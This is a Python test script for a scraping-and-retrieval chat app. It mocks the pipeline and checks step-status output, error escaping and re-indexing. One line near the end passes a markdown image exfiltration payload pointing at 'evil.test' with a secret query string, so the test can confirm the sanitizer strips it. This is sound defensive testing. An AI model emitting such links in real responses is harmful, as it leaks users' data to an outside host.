"""Offline check of the pipeline steps shown in the UI. Run: python test_app.py

Kept apart from smoke_test.py because loading Scrapy and Gradio in one process breaks Gradio.
"""
from types import SimpleNamespace
from unittest.mock import patch

import app


class FakeKnowledgeBase:
    chunks = [1, 2]

    def __init__(self, *args):
        pass

    def retriever(self, name):
        if name == "recursive":
            raise RuntimeError("<boom>")


def run(scraped, build_all=True):
    fakes = {
        "scrape_web_page": lambda url: scraped,
        "load_documents": lambda: [SimpleNamespace()],
        "embedding_model": lambda: None,
        "create_watsonx_llm": lambda: None,
        "KnowledgeBase": FakeKnowledgeBase,
    }
    with patch.multiple(app, **fakes):
        return list(app.process_url("https://example.com", "llama3.2", build_all))


def reindex(documents):
    fakes = {
        "load_documents": lambda: documents,
        "embedding_model": lambda: None,
        "create_watsonx_llm": lambda: None,
        "KnowledgeBase": FakeKnowledgeBase,
        "scrape_web_page": None,  # re-indexing must not scrape
    }
    with patch.multiple(app, **fakes):
        return list(app.reindex_saved_pages("llama3.2"))


app.create_gradio_interface()

# after a restart: saved pages are indexed again without scraping, only once
assert "No saved page" in reindex([])[-1][1] and app.state["knowledge_base"] is None
restart_html, restart_message = reindex([SimpleNamespace()])[-1]
assert "(non nécessaire)" in restart_html and "Ready" in restart_message, restart_message
assert restart_html.count("(terminé)") == 3, restart_html  # chunking, model, vector
assert "already indexed" in reindex([SimpleNamespace()])[-1][1]

# the chat is usable as soon as "vector" is done, before the other retrievers
app.state["knowledge_base"] = None
ready_at = []
with patch.multiple(app, scrape_web_page=lambda url: {"title": "T", "text": "x"},
                    load_documents=lambda: [SimpleNamespace()], embedding_model=lambda: None,
                    create_watsonx_llm=lambda: None, KnowledgeBase=FakeKnowledgeBase):
    for steps, _ in app.process_url("https://example.com", "llama3.2"):
        if "bm25" in steps and app.state["knowledge_base"] is not None:
            ready_at.append(steps.count("(terminé)"))
assert ready_at and ready_at[0] == 4, ready_at  # scraping, chunking, model, vector
page = {"title": "T", "text": "hello"}

updates = run(page)
assert "en cours" in updates[0][0] and len(updates) > 5, "steps must be streamed"
final_html, message = updates[-1]
assert final_html.count("(terminé)") == 8 and final_html.count("(échec)") == 1, final_html
assert "&lt;boom&gt;" in final_html and "<boom>" not in final_html, "error text must be escaped"
assert "recursive" in message and app.state["knowledge_base"] is not None

assert run(page, build_all=False)[-1][0].count("(à la première utilisation)") == 5

failed_html = run({})[-1][0]
assert failed_html.count("(échec)") == 1 and failed_html.count("(en attente)") == 8, failed_html

leak = app.plain_text("![x](http://evil.test/?q=secret) <img src=x>")
assert "![" not in leak and "<img" not in leak, leak
print("app ok")
